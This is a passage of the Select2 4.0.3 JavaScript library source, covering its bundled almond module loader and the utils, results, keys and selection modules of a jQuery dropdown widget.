/*!
 * Select2 4.0.3
 * https://select2.github.io
 *
 * Released under the MIT license
 * https://github.com/select2/select2/blob/master/LICENSE.md
 */
(function (factory) {
  if (typeof define === 'function' && define.amd) {
    // AMD. Register as an anonymous module.
    define(['jquery'], factory);
  } else if (typeof module === 'object' && module.exports) {
    // Node/CommonJS
    module.exports = function (root, jQuery) {
      if (jQuery === undefined) {
        // require('jQuery') returns a factory that requires window to
        // build a jQuery instance, we normalize how we use modules
        // that require this pattern but the window provided is a noop
        // if it's defined (how jquery works)
        if (typeof window !== 'undefined') {
          jQuery = require('jquery');
        }
        else {
          jQuery = require('jquery')(root);
        }
      }
      factory(jQuery);
      return jQuery;
    };
  } else {
    // Browser globals
    factory(jQuery);
  }
} (function (jQuery) {
  // This is needed so we can catch the AMD loader configuration and use it
  // The inner file should be wrapped (by `banner.start.js`) in a function that
  // returns the AMD loader references.
  var S2 =(function () {
  // Restore the Select2 AMD loader so it can be used
  // Needed mostly in the language files, where the loader is not inserted
  if (jQuery && jQuery.fn && jQuery.fn.select2 && jQuery.fn.select2.amd) {
    var S2 = jQuery.fn.select2.amd;
  }
var S2;(function () { if (!S2 || !S2.requirejs) {
if (!S2) { S2 = {}; } else { require = S2; }
/**
 * @license almond 0.3.1 Copyright (c) 2011-2014, The Dojo Foundation All Rights Reserved.
 * Available via the MIT or new BSD license.
 * see: http://github.com/jrburke/almond for details
 */
//Going sloppy to avoid 'use strict' string cost, but strict practices should
//be followed.
/*jslint sloppy: true */
/*global setTimeout: false */

var requirejs, require, define;
(function (undef) {
    var main, req, makeMap, handlers,
        defined = {},
        waiting = {},
        config = {},
        defining = {},
        hasOwn = Object.prototype.hasOwnProperty,
        aps = [].slice,
        jsSuffixRegExp = /\.js$/;

    function hasProp(obj, prop) {
        return hasOwn.call(obj, prop);
    }

    /**
     * Given a relative module name, like ./something, normalize it to
     * a real name that can be mapped to a path.
     * @param {String} name the relative name
     * @param {String} baseName a real name that the name arg is relative
     * to.
     * @returns {String} normalized name
     */
    function normalize(name, baseName) {
        var nameParts, nameSegment, mapValue, foundMap, lastIndex,
            foundI, foundStarMap, starI, i, j, part,
            baseParts = baseName && baseName.split("/"),
            map = config.map,
            starMap = (map && map['*']) || {};

        //Adjust any relative paths.
        if (name && name.charAt(0) === ".") {
            //If have a base name, try to normalize against it,
            //otherwise, assume it is a top-level require that will
            //be relative to baseUrl in the end.
            if (baseName) {
                name = name.split('/');
                lastIndex = name.length - 1;

                // Node .js allowance:
                if (config.nodeIdCompat && jsSuffixRegExp.test(name[lastIndex])) {
                    name[lastIndex] = name[lastIndex].replace(jsSuffixRegExp, '');
                }

                //Lop off the last part of baseParts, so that . matches the
                //"directory" and not name of the baseName's module. For instance,
                //baseName of "one/two/three", maps to "one/two/three.js", but we
                //want the directory, "one/two" for this normalization.
                name = baseParts.slice(0, baseParts.length - 1).concat(name);

                //start trimDots
                for (i = 0; i < name.length; i += 1) {
                    part = name[i];
                    if (part === ".") {
                        name.splice(i, 1);
                        i -= 1;
                    } else if (part === "..") {
                        if (i === 1 && (name[2] === '..' || name[0] === '..')) {
                            //End of the line. Keep at least one non-dot
                            //path segment at the front so it can be mapped
                            //correctly to disk. Otherwise, there is likely
                            //no path mapping for a path starting with '..'.
                            //This can still fail, but catches the most reasonable
                            //uses of ..
                            break;
                        } else if (i > 0) {
                            name.splice(i - 1, 2);
                            i -= 2;
                        }
                    }
                }
                //end trimDots

                name = name.join("/");
            } else if (name.indexOf('./') === 0) {
                // No baseName, so this is ID is resolved relative
                // to baseUrl, pull off the leading dot.
                name = name.substring(2);
            }
        }

        //Apply map config if available.
        if ((baseParts || starMap) && map) {
            nameParts = name.split('/');

            for (i = nameParts.length; i > 0; i -= 1) {
                nameSegment = nameParts.slice(0, i).join("/");

                if (baseParts) {
                    //Find the longest baseName segment match in the config.
                    //So, do joins on the biggest to smallest lengths of baseParts.
                    for (j = baseParts.length; j > 0; j -= 1) {
                        mapValue = map[baseParts.slice(0, j).join('/')];

                        //baseName segment has  config, find if it has one for
                        //this name.
                        if (mapValue) {
                            mapValue = mapValue[nameSegment];
                            if (mapValue) {
                                //Match, update name to the new value.
                                foundMap = mapValue;
                                foundI = i;
                                break;
                            }
                        }
                    }
                }

                if (foundMap) {
                    break;
                }

                //Check for a star map match, but just hold on to it,
                //if there is a shorter segment match later in a matching
                //config, then favor over this star map.
                if (!foundStarMap && starMap && starMap[nameSegment]) {
                    foundStarMap = starMap[nameSegment];
                    starI = i;
                }
            }

            if (!foundMap && foundStarMap) {
                foundMap = foundStarMap;
                foundI = starI;
            }

            if (foundMap) {
                nameParts.splice(0, foundI, foundMap);
                name = nameParts.join('/');
            }
        }

        return name;
    }

    function makeRequire(relName, forceSync) {
        return function () {
            //A version of a require function that passes a moduleName
            //value for items that may need to
            //look up paths relative to the moduleName
            var args = aps.call(arguments, 0);

            //If first arg is not require('string'), and there is only
            //one arg, it is the array form without a callback. Insert
            //a null so that the following concat is correct.
            if (typeof args[0] !== 'string' && args.length === 1) {
                args.push(null);
            }
            return req.apply(undef, args.concat([relName, forceSync]));
        };
    }

    function makeNormalize(relName) {
        return function (name) {
            return normalize(name, relName);
        };
    }

    function makeLoad(depName) {
        return function (value) {
            defined[depName] = value;
        };
    }

    function callDep(name) {
        if (hasProp(waiting, name)) {
            var args = waiting[name];
            delete waiting[name];
            defining[name] = true;
            main.apply(undef, args);
        }

        if (!hasProp(defined, name) && !hasProp(defining, name)) {
            throw new Error('No ' + name);
        }
        return defined[name];
    }

    //Turns a plugin!resource to [plugin, resource]
    //with the plugin being undefined if the name
    //did not have a plugin prefix.
    function splitPrefix(name) {
        var prefix,
            index = name ? name.indexOf('!') : -1;
        if (index > -1) {
            prefix = name.substring(0, index);
            name = name.substring(index + 1, name.length);
        }
        return [prefix, name];
    }

    /**
     * Makes a name map, normalizing the name, and using a plugin
     * for normalization if necessary. Grabs a ref to plugin
     * too, as an optimization.
     */
    makeMap = function (name, relName) {
        var plugin,
            parts = splitPrefix(name),
            prefix = parts[0];

        name = parts[1];

        if (prefix) {
            prefix = normalize(prefix, relName);
            plugin = callDep(prefix);
        }

        //Normalize according
        if (prefix) {
            if (plugin && plugin.normalize) {
                name = plugin.normalize(name, makeNormalize(relName));
            } else {
                name = normalize(name, relName);
            }
        } else {
            name = normalize(name, relName);
            parts = splitPrefix(name);
            prefix = parts[0];
            name = parts[1];
            if (prefix) {
                plugin = callDep(prefix);
            }
        }

        //Using ridiculous property names for space reasons
        return {
            f: prefix ? prefix + '!' + name : name, //fullName
            n: name,
            pr: prefix,
            p: plugin
        };
    };

    function makeConfig(name) {
        return function () {
            return (config && config.config && config.config[name]) || {};
        };
    }

    handlers = {
        require: function (name) {
            return makeRequire(name);
        },
        exports: function (name) {
            var e = defined[name];
            if (typeof e !== 'undefined') {
                return e;
            } else {
                return (defined[name] = {});
            }
        },
        module: function (name) {
            return {
                id: name,
                uri: '',
                exports: defined[name],
                config: makeConfig(name)
            };
        }
    };

    main = function (name, deps, callback, relName) {
        var cjsModule, depName, ret, map, i,
            args = [],
            callbackType = typeof callback,
            usingExports;

        //Use name if no relName
        relName = relName || name;

        //Call the callback to define the module, if necessary.
        if (callbackType === 'undefined' || callbackType === 'function') {
            //Pull out the defined dependencies and pass the ordered
            //values to the callback.
            //Default to [require, exports, module] if no deps
            deps = !deps.length && callback.length ? ['require', 'exports', 'module'] : deps;
            for (i = 0; i < deps.length; i += 1) {
                map = makeMap(deps[i], relName);
                depName = map.f;

                //Fast path CommonJS standard dependencies.
                if (depName === "require") {
                    args[i] = handlers.require(name);
                } else if (depName === "exports") {
                    //CommonJS module spec 1.1
                    args[i] = handlers.exports(name);
                    usingExports = true;
                } else if (depName === "module") {
                    //CommonJS module spec 1.1
                    cjsModule = args[i] = handlers.module(name);
                } else if (hasProp(defined, depName) ||
                           hasProp(waiting, depName) ||
                           hasProp(defining, depName)) {
                    args[i] = callDep(depName);
                } else if (map.p) {
                    map.p.load(map.n, makeRequire(relName, true), makeLoad(depName), {});
                    args[i] = defined[depName];
                } else {
                    throw new Error(name + ' missing ' + depName);
                }
            }

            ret = callback ? callback.apply(defined[name], args) : undefined;

            if (name) {
                //If setting exports via "module" is in play,
                //favor that over return value and exports. After that,
                //favor a non-undefined return value over exports use.
                if (cjsModule && cjsModule.exports !== undef &&
                        cjsModule.exports !== defined[name]) {
                    defined[name] = cjsModule.exports;
                } else if (ret !== undef || !usingExports) {
                    //Use the return value from the function.
                    defined[name] = ret;
                }
            }
        } else if (name) {
            //May just be an object definition for the module. Only
            //worry about defining if have a module name.
            defined[name] = callback;
        }
    };

    requirejs = require = req = function (deps, callback, relName, forceSync, alt) {
        if (typeof deps === "string") {
            if (handlers[deps]) {
                //callback in this case is really relName
                return handlers[deps](callback);
            }
            //Just return the module wanted. In this scenario, the
            //deps arg is the module name, and second arg (if passed)
            //is just the relName.
            //Normalize module name, if it contains . or ..
            return callDep(makeMap(deps, callback).f);
        } else if (!deps.splice) {
            //deps is a config object, not an array.
            config = deps;
            if (config.deps) {
                req(config.deps, config.callback);
            }
            if (!callback) {
                return;
            }

            if (callback.splice) {
                //callback is an array, which means it is a dependency list.
                //Adjust args if there are dependencies
                deps = callback;
                callback = relName;
                relName = null;
            } else {
                deps = undef;
            }
        }

        //Support require(['a'])
        callback = callback || function () {};

        //If relName is a function, it is an errback handler,
        //so remove it.
        if (typeof relName === 'function') {
            relName = forceSync;
            forceSync = alt;
        }

        //Simulate async callback;
        if (forceSync) {
            main(undef, deps, callback, relName);
        } else {
            //Using a non-zero value because of concern for what old browsers
            //do, and latest browsers "upgrade" to 4 if lower value is used:
            //http://www.whatwg.org/specs/web-apps/current-work/multipage/timers.html#dom-windowtimers-settimeout:
            //If want a value immediately, use require('id') instead -- something
            //that works in almond on the global level, but not guaranteed and
            //unlikely to work in other AMD implementations.
            setTimeout(function () {
                main(undef, deps, callback, relName);
            }, 4);
        }

        return req;
    };

    /**
     * Just drops the config on the floor, but returns req in case
     * the config return value is used.
     */
    req.config = function (cfg) {
        return req(cfg);
    };

    /**
     * Expose module registry for debugging and tooling
     */
    requirejs._defined = defined;

    define = function (name, deps, callback) {
        if (typeof name !== 'string') {
            throw new Error('See almond README: incorrect module build, no module name');
        }

        //This module may not have dependencies
        if (!deps.splice) {
            //deps is not an array, so probably means
            //an object literal or factory function for
            //the value. Adjust args.
            callback = deps;
            deps = [];
        }

        if (!hasProp(defined, name) && !hasProp(waiting, name)) {
            waiting[name] = [name, deps, callback];
        }
    };

    define.amd = {
        jQuery: true
    };
}());

S2.requirejs = requirejs;S2.require = require;S2.define = define;
}
}());
S2.define("almond", function(){});

/* global jQuery:false, $:false */
S2.define('jquery',[],function () {
  var _$ = jQuery || $;

  if (_$ == null && console && console.error) {
    console.error(
      'Select2: An instance of jQuery or a jQuery-compatible library was not ' +
      'found. Make sure that you are including jQuery before Select2 on your ' +
      'web page.'
    );
  }

  return _$;
});

S2.define('select2/utils',[
  'jquery'
], function ($) {
  var Utils = {};

  Utils.Extend = function (ChildClass, SuperClass) {
    var __hasProp = {}.hasOwnProperty;

    function BaseConstructor () {
      this.constructor = ChildClass;
    }

    for (var key in SuperClass) {
      if (__hasProp.call(SuperClass, key)) {
        ChildClass[key] = SuperClass[key];
      }
    }

    BaseConstructor.prototype = SuperClass.prototype;
    ChildClass.prototype = new BaseConstructor();
    ChildClass.__super__ = SuperClass.prototype;

    return ChildClass;
  };

  function getMethods (theClass) {
    var proto = theClass.prototype;

    var methods = [];

    for (var methodName in proto) {
      var m = proto[methodName];

      if (typeof m !== 'function') {
        continue;
      }

      if (methodName === 'constructor') {
        continue;
      }

      methods.push(methodName);
    }

    return methods;
  }

  Utils.Decorate = function (SuperClass, DecoratorClass) {
    var decoratedMethods = getMethods(DecoratorClass);
    var superMethods = getMethods(SuperClass);

    function DecoratedClass () {
      var unshift = Array.prototype.unshift;

      var argCount = DecoratorClass.prototype.constructor.length;

      var calledConstructor = SuperClass.prototype.constructor;

      if (argCount > 0) {
        unshift.call(arguments, SuperClass.prototype.constructor);

        calledConstructor = DecoratorClass.prototype.constructor;
      }

      calledConstructor.apply(this, arguments);
    }

    DecoratorClass.displayName = SuperClass.displayName;

    function ctr () {
      this.constructor = DecoratedClass;
    }

    DecoratedClass.prototype = new ctr();

    for (var m = 0; m < superMethods.length; m++) {
        var superMethod = superMethods[m];

        DecoratedClass.prototype[superMethod] =
          SuperClass.prototype[superMethod];
    }

    var calledMethod = function (methodName) {
      // Stub out the original method if it's not decorating an actual method
      var originalMethod = function () {};

      if (methodName in DecoratedClass.prototype) {
        originalMethod = DecoratedClass.prototype[methodName];
      }

      var decoratedMethod = DecoratorClass.prototype[methodName];

      return function () {
        var unshift = Array.prototype.unshift;

        unshift.call(arguments, originalMethod);

        return decoratedMethod.apply(this, arguments);
      };
    };

    for (var d = 0; d < decoratedMethods.length; d++) {
      var decoratedMethod = decoratedMethods[d];

      DecoratedClass.prototype[decoratedMethod] = calledMethod(decoratedMethod);
    }

    return DecoratedClass;
  };

  var Observable = function () {
    this.listeners = {};
  };

  Observable.prototype.on = function (event, callback) {
    this.listeners = this.listeners || {};

    if (event in this.listeners) {
      this.listeners[event].push(callback);
    } else {
      this.listeners[event] = [callback];
    }
  };

  Observable.prototype.trigger = function (event) {
    var slice = Array.prototype.slice;
    var params = slice.call(arguments, 1);

    this.listeners = this.listeners || {};

    // Params should always come in as an array
    if (params == null) {
      params = [];
    }

    // If there are no arguments to the event, use a temporary object
    if (params.length === 0) {
      params.push({});
    }

    // Set the `_type` of the first object to the event
    params[0]._type = event;

    if (event in this.listeners) {
      this.invoke(this.listeners[event], slice.call(arguments, 1));
    }

    if ('*' in this.listeners) {
      this.invoke(this.listeners['*'], arguments);
    }
  };

  Observable.prototype.invoke = function (listeners, params) {
    for (var i = 0, len = listeners.length; i < len; i++) {
      listeners[i].apply(this, params);
    }
  };

  Utils.Observable = Observable;

  Utils.generateChars = function (length) {
    var chars = '';

    for (var i = 0; i < length; i++) {
      var randomChar = Math.floor(Math.random() * 36);
      chars += randomChar.toString(36);
    }

    return chars;
  };

  Utils.bind = function (func, context) {
    return function () {
      func.apply(context, arguments);
    };
  };

  Utils._convertData = function (data) {
    for (var originalKey in data) {
      var keys = originalKey.split('-');

      var dataLevel = data;

      if (keys.length === 1) {
        continue;
      }

      for (var k = 0; k < keys.length; k++) {
        var key = keys[k];

        // Lowercase the first letter
        // By default, dash-separated becomes camelCase
        key = key.substring(0, 1).toLowerCase() + key.substring(1);

        if (!(key in dataLevel)) {
          dataLevel[key] = {};
        }

        if (k == keys.length - 1) {
          dataLevel[key] = data[originalKey];
        }

        dataLevel = dataLevel[key];
      }

      delete data[originalKey];
    }

    return data;
  };

  Utils.hasScroll = function (index, el) {
    // Adapted from the function created by @ShadowScripter
    // and adapted by @BillBarry on the Stack Exchange Code Review website.
    // The original code can be found at
    // http://codereview.stackexchange.com/q/13338
    // and was designed to be used with the Sizzle selector engine.

    var $el = $(el);
    var overflowX = el.style.overflowX;
    var overflowY = el.style.overflowY;

    //Check both x and y declarations
    if (overflowX === overflowY &&
        (overflowY === 'hidden' || overflowY === 'visible')) {
      return false;
    }

    if (overflowX === 'scroll' || overflowY === 'scroll') {
      return true;
    }

    return ($el.innerHeight() < el.scrollHeight ||
      $el.innerWidth() < el.scrollWidth);
  };

  Utils.escapeMarkup = function (markup) {
    var replaceMap = {
      '\\': '&#92;',
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      '\'': '&#39;',
      '/': '&#47;'
    };

    // Do not try to escape the markup if it's not a string
    if (typeof markup !== 'string') {
      return markup;
    }

    return String(markup).replace(/[&<>"'\/\\]/g, function (match) {
      return replaceMap[match];
    });
  };

  // Append an array of jQuery nodes to a given element.
  Utils.appendMany = function ($element, $nodes) {
    // jQuery 1.7.x does not support $.fn.append() with an array
    // Fall back to a jQuery object collection using $.fn.add()
    if ($.fn.jquery.substr(0, 3) === '1.7') {
      var $jqNodes = $();

      $.map($nodes, function (node) {
        $jqNodes = $jqNodes.add(node);
      });

      $nodes = $jqNodes;
    }

    $element.append($nodes);
  };

  return Utils;
});

S2.define('select2/results',[
  'jquery',
  './utils'
], function ($, Utils) {
  function Results ($element, options, dataAdapter) {
    this.$element = $element;
    this.data = dataAdapter;
    this.options = options;

    Results.__super__.constructor.call(this);
  }

  Utils.Extend(Results, Utils.Observable);

  Results.prototype.render = function () {
    var $results = $(
      '<ul class="select2-results__options" role="tree"></ul>'
    );

    if (this.options.get('multiple')) {
      $results.attr('aria-multiselectable', 'true');
    }

    this.$results = $results;

    return $results;
  };

  Results.prototype.clear = function () {
    this.$results.empty();
  };

  Results.prototype.displayMessage = function (params) {
    var escapeMarkup = this.options.get('escapeMarkup');

    this.clear();
    this.hideLoading();

    var $message = $(
      '<li role="treeitem" aria-live="assertive"' +
      ' class="select2-results__option"></li>'
    );

    var message = this.options.get('translations').get(params.message);

    $message.append(
      escapeMarkup(
        message(params.args)
      )
    );

    $message[0].className += ' select2-results__message';

    this.$results.append($message);
  };

  Results.prototype.hideMessages = function () {
    this.$results.find('.select2-results__message').remove();
  };

  Results.prototype.append = function (data) {
    this.hideLoading();

    var $options = [];

    if (data.results == null || data.results.length === 0) {
      if (this.$results.children().length === 0) {
        this.trigger('results:message', {
          message: 'noResults'
        });
      }

      return;
    }

    data.results = this.sort(data.results);

    for (var d = 0; d < data.results.length; d++) {
      var item = data.results[d];

      var $option = this.option(item);

      $options.push($option);
    }

    this.$results.append($options);
  };

  Results.prototype.position = function ($results, $dropdown) {
    var $resultsContainer = $dropdown.find('.select2-results');
    $resultsContainer.append($results);
  };

  Results.prototype.sort = function (data) {
    var sorter = this.options.get('sorter');

    return sorter(data);
  };

  Results.prototype.highlightFirstItem = function () {
    var $options = this.$results
      .find('.select2-results__option[aria-selected]');

    var $selected = $options.filter('[aria-selected=true]');

    // Check if there are any selected options
    if ($selected.length > 0) {
      // If there are selected options, highlight the first
      $selected.first().trigger('mouseenter');
    } else {
      // If there are no selected options, highlight the first option
      // in the dropdown
      $options.first().trigger('mouseenter');
    }

    this.ensureHighlightVisible();
  };

  Results.prototype.setClasses = function () {
    var self = this;

    this.data.current(function (selected) {
      var selectedIds = $.map(selected, function (s) {
        return s.id.toString();
      });

      var $options = self.$results
        .find('.select2-results__option[aria-selected]');

      $options.each(function () {
        var $option = $(this);

        var item = $.data(this, 'data');

        // id needs to be converted to a string when comparing
        var id = '' + item.id;

        if ((item.element != null && item.element.selected) ||
            (item.element == null && $.inArray(id, selectedIds) > -1)) {
          $option.attr('aria-selected', 'true');
        } else {
          $option.attr('aria-selected', 'false');
        }
      });

    });
  };

  Results.prototype.showLoading = function (params) {
    this.hideLoading();

    var loadingMore = this.options.get('translations').get('searching');

    var loading = {
      disabled: true,
      loading: true,
      text: loadingMore(params)
    };
    var $loading = this.option(loading);
    $loading.className += ' loading-results';

    this.$results.prepend($loading);
  };

  Results.prototype.hideLoading = function () {
    this.$results.find('.loading-results').remove();
  };

  Results.prototype.option = function (data) {
    var option = document.createElement('li');
    option.className = 'select2-results__option';

    var attrs = {
      'role': 'treeitem',
      'aria-selected': 'false'
    };

    if (data.disabled) {
      delete attrs['aria-selected'];
      attrs['aria-disabled'] = 'true';
    }

    if (data.id == null) {
      delete attrs['aria-selected'];
    }

    if (data._resultId != null) {
      option.id = data._resultId;
    }

    if (data.title) {
      option.title = data.title;
    }

    if (data.children) {
      attrs.role = 'group';
      attrs['aria-label'] = data.text;
      delete attrs['aria-selected'];
    }

    for (var attr in attrs) {
      var val = attrs[attr];

      option.setAttribute(attr, val);
    }

    if (data.children) {
      var $option = $(option);

      var label = document.createElement('strong');
      label.className = 'select2-results__group';

      var $label = $(label);
      this.template(data, label);

      var $children = [];

      for (var c = 0; c < data.children.length; c++) {
        var child = data.children[c];

        var $child = this.option(child);

        $children.push($child);
      }

      var $childrenContainer = $('<ul></ul>', {
        'class': 'select2-results__options select2-results__options--nested'
      });

      $childrenContainer.append($children);

      $option.append(label);
      $option.append($childrenContainer);
    } else {
      this.template(data, option);
    }

    $.data(option, 'data', data);

    return option;
  };

  Results.prototype.bind = function (container, $container) {
    var self = this;

    var id = container.id + '-results';

    this.$results.attr('id', id);

    container.on('results:all', function (params) {
      self.clear();
      self.append(params.data);

      if (container.isOpen()) {
        self.setClasses();
        self.highlightFirstItem();
      }
    });

    container.on('results:append', function (params) {
      self.append(params.data);

      if (container.isOpen()) {
        self.setClasses();
      }
    });

    container.on('query', function (params) {
      self.hideMessages();
      self.showLoading(params);
    });

    container.on('select', function () {
      if (!container.isOpen()) {
        return;
      }

      self.setClasses();
      self.highlightFirstItem();
    });

    container.on('unselect', function () {
      if (!container.isOpen()) {
        return;
      }

      self.setClasses();
      self.highlightFirstItem();
    });

    container.on('open', function () {
      // When the dropdown is open, aria-expended="true"
      self.$results.attr('aria-expanded', 'true');
      self.$results.attr('aria-hidden', 'false');

      self.setClasses();
      self.ensureHighlightVisible();
    });

    container.on('close', function () {
      // When the dropdown is closed, aria-expended="false"
      self.$results.attr('aria-expanded', 'false');
      self.$results.attr('aria-hidden', 'true');
      self.$results.removeAttr('aria-activedescendant');
    });

    container.on('results:toggle', function () {
      var $highlighted = self.getHighlightedResults();

      if ($highlighted.length === 0) {
        return;
      }

      $highlighted.trigger('mouseup');
    });

    container.on('results:select', function () {
      var $highlighted = self.getHighlightedResults();

      if ($highlighted.length === 0) {
        return;
      }

      var data = $highlighted.data('data');

      if ($highlighted.attr('aria-selected') == 'true') {
        self.trigger('close', {});
      } else {
        self.trigger('select', {
          data: data
        });
      }
    });

    container.on('results:previous', function () {
      var $highlighted = self.getHighlightedResults();

      var $options = self.$results.find('[aria-selected]');

      var currentIndex = $options.index($highlighted);

      // If we are already at te top, don't move further
      if (currentIndex === 0) {
        return;
      }

      var nextIndex = currentIndex - 1;

      // If none are highlighted, highlight the first
      if ($highlighted.length === 0) {
        nextIndex = 0;
      }

      var $next = $options.eq(nextIndex);

      $next.trigger('mouseenter');

      var currentOffset = self.$results.offset().top;
      var nextTop = $next.offset().top;
      var nextOffset = self.$results.scrollTop() + (nextTop - currentOffset);

      if (nextIndex === 0) {
        self.$results.scrollTop(0);
      } else if (nextTop - currentOffset < 0) {
        self.$results.scrollTop(nextOffset);
      }
    });

    container.on('results:next', function () {
      var $highlighted = self.getHighlightedResults();

      var $options = self.$results.find('[aria-selected]');

      var currentIndex = $options.index($highlighted);

      var nextIndex = currentIndex + 1;

      // If we are at the last option, stay there
      if (nextIndex >= $options.length) {
        return;
      }

      var $next = $options.eq(nextIndex);

      $next.trigger('mouseenter');

      var currentOffset = self.$results.offset().top +
        self.$results.outerHeight(false);
      var nextBottom = $next.offset().top + $next.outerHeight(false);
      var nextOffset = self.$results.scrollTop() + nextBottom - currentOffset;

      if (nextIndex === 0) {
        self.$results.scrollTop(0);
      } else if (nextBottom > currentOffset) {
        self.$results.scrollTop(nextOffset);
      }
    });

    container.on('results:focus', function (params) {
      params.element.addClass('select2-results__option--highlighted');
    });

    container.on('results:message', function (params) {
      self.displayMessage(params);
    });

    if ($.fn.mousewheel) {
      this.$results.on('mousewheel', function (e) {
        var top = self.$results.scrollTop();

        var bottom = self.$results.get(0).scrollHeight - top + e.deltaY;

        var isAtTop = e.deltaY > 0 && top - e.deltaY <= 0;
        var isAtBottom = e.deltaY < 0 && bottom <= self.$results.height();

        if (isAtTop) {
          self.$results.scrollTop(0);

          e.preventDefault();
          e.stopPropagation();
        } else if (isAtBottom) {
          self.$results.scrollTop(
            self.$results.get(0).scrollHeight - self.$results.height()
          );

          e.preventDefault();
          e.stopPropagation();
        }
      });
    }

    this.$results.on('mouseup', '.select2-results__option[aria-selected]',
      function (evt) {
      var $this = $(this);

      var data = $this.data('data');

      if ($this.attr('aria-selected') === 'true') {
        if (self.options.get('multiple')) {
          self.trigger('unselect', {
            originalEvent: evt,
            data: data
          });
        } else {
          self.trigger('close', {});
        }

        return;
      }

      self.trigger('select', {
        originalEvent: evt,
        data: data
      });
    });

    this.$results.on('mouseenter', '.select2-results__option[aria-selected]',
      function (evt) {
      var data = $(this).data('data');

      self.getHighlightedResults()
          .removeClass('select2-results__option--highlighted');

      self.trigger('results:focus', {
        data: data,
        element: $(this)
      });
    });
  };

  Results.prototype.getHighlightedResults = function () {
    var $highlighted = this.$results
    .find('.select2-results__option--highlighted');

    return $highlighted;
  };

  Results.prototype.destroy = function () {
    this.$results.remove();
  };

  Results.prototype.ensureHighlightVisible = function () {
    var $highlighted = this.getHighlightedResults();

    if ($highlighted.length === 0) {
      return;
    }

    var $options = this.$results.find('[aria-selected]');

    var currentIndex = $options.index($highlighted);

    var currentOffset = this.$results.offset().top;
    var nextTop = $highlighted.offset().top;
    var nextOffset = this.$results.scrollTop() + (nextTop - currentOffset);

    var offsetDelta = nextTop - currentOffset;
    nextOffset -= $highlighted.outerHeight(false) * 2;

    if (currentIndex <= 2) {
      this.$results.scrollTop(0);
    } else if (offsetDelta > this.$results.outerHeight() || offsetDelta < 0) {
      this.$results.scrollTop(nextOffset);
    }
  };

  Results.prototype.template = function (result, container) {
    var template = this.options.get('templateResult');
    var escapeMarkup = this.options.get('escapeMarkup');

    var content = template(result, container);

    if (content == null) {
      container.style.display = 'none';
    } else if (typeof content === 'string') {
      container.innerHTML = escapeMarkup(content);
    } else {
      $(container).append(content);
    }
  };

  return Results;
});

S2.define('select2/keys',[

], function () {
  var KEYS = {
    BACKSPACE: 8,
    TAB: 9,
    ENTER: 13,
    SHIFT: 16,
    CTRL: 17,
    ALT: 18,
    ESC: 27,
    SPACE: 32,
    PAGE_UP: 33,
    PAGE_DOWN: 34,
    END: 35,
    HOME: 36,
    LEFT: 37,
    UP: 38,
    RIGHT: 39,
    DOWN: 40,
    DELETE: 46
  };

  return KEYS;
});

S2.define('select2/selection/base',[
  'jquery',
  '../utils',
  '../keys'
], function ($, Utils, KEYS) {
  function BaseSelection ($element, options) {
    this.$element = $element;
    this.options = options;

    BaseSelection.__super__.constructor.call(this);
  }

  Utils.Extend(BaseSelection, Utils.Observable);

  BaseSelection.prototype.render = function () {
    var $selection = $(
      '<span class="select2-selection" role="combobox" ' +
      ' aria-haspopup="true" aria-expanded="false">' +
      '</span>'
    );

    this._tabindex = 0;

    if (this.$element.data('old-tabindex') != null) {
      this._tabindex = this.$element.data('old-tabindex');
    } else if (this.$element.attr('tabindex') != null) {
      this._tabindex = this.$element.attr('tabindex');
    }

    $selection.attr('title', this.$element.attr('title'));
    $selection.attr('tabindex', this._tabindex);

    this.$selection = $selection;

    return $selection;
  };

  BaseSelection.prototype.bind = function (container, $container) {
    var self = this;

    var id = container.id + '-container';
    var resultsId = container.id + '-results';

    this.container = container;

    this.$selection.on('focus', function (evt) {
      self.trigger('focus', evt);
    });

    this.$selection.on('blur', function (evt) {
      self._handleBlur(evt);
    });

    this.$selection.on('keydown', function (evt) {
      self.trigger('keypress', evt);

      if (evt.which === KEYS.SPACE) {
        evt.preventDefault();
      }
    });

    container.on('results:focus', function (params) {
      self.$selection.attr('aria-activedescendant', params.data._resultId);
    });

    container.on('selection:update', function (params) {
      self.update(params.data);
    });

    container.on('open', function () {
      // When the dropdown is open, aria-expanded="true"
      self.$selection.attr('aria-expanded', 'true');
      self.$selection.attr('aria-owns', resultsId);

      self._attachCloseHandler(container);
    });

    container.on('close', function () {
      // When the dropdown is closed, aria-expanded="false"
      self.$selection.attr('aria-expanded', 'false');
      self.$selection.removeAttr('aria-activedescendant');
      self.$selection.removeAttr('aria-owns');

      self.$selection.focus();

      self._detachCloseHandler(container);
    });

    container.on('enable', function () {
      self.$selection.attr('tabindex', self._tabindex);
    });

    container.on('disable', function () {
      self.$selection.attr('tabindex', '-1');
    });
  };

  BaseSelection.prototype._handleBlur = function (evt) {
    var self = this;

    // This needs to be delayed as the active element is the body when the tab
    // key is pressed, possibly along with others.
    window.setTimeout(function () {
      // Don't trigger `blur` if the focus is still in the selection
      if (
        (document.activeElement == self.$selection[0]) ||
        ($.contains(self.$selection[0], document.activeElement))
      ) {
        return;
      }

      self.trigger('blur', evt);
    }, 1);
  };

  BaseSelection.prototype._attachCloseHandler = function (container) {
    var self = this;

    $(document.body).on('mousedown.select2.' + container.id, function (e) {
      var $target = $(e.target);

      var $select = $target.closest('.select2');

      var $all = $('.select2.select2-container--open');

      $all.each(function () {
        var $this = $(this);

        if (this == $select[0]) {
          return;
        }

        var $element = $this.data('element');

        $element.select2('close');
      });
    });
  };

  BaseSelection.prototype._detachCloseHandler = function (container) {
    $(document.body).off('mousedown.select2.' + container.id);
  };

  BaseSelection.prototype.position = function ($selection, $container) {
    var $selectionContainer = $container.find('.selection');
    $selectionContainer.append($selection);
  };

  BaseSelection.prototype.destroy = function () {
    this._detachCloseHandler(this.container);
  };

  BaseSelection.prototype.update = function (data) {
    throw new Error('The `update` method must be defined in child classes.');
  };

  return BaseSelection;
});

S2.define('select2/selection/single',[
  'jquery',
  './base',
  '../utils',
  '../keys'
], function ($, BaseSelection, Utils, KEYS) {
  function SingleSelection () {
    SingleSelection.__super__.constructor.apply(this, arguments);
  }

  Utils.Extend(SingleSelection, BaseSelection);

  SingleSelection.prototype.render = function () {
    var $selection = SingleSelection.__super__.render.call(this);

    $selection.addClass('select2-selection--single');

    $selection.html(
      '<span class="select2-selection__rendered"></span>' +
      '<span class="select2-selection__arrow" role="presentation">' +
        '<b role="presentation"></b>' +
      '</span>'
    );

    return $selection;
  };

  SingleSelection.prototype.bind = function (container, $container) {
    var self = this;

    SingleSelection.__super__.bind.apply(this, arguments);

    var id = container.id + '-container';

    this.$selection.find('.select2-selection__rendered').attr('id', id);
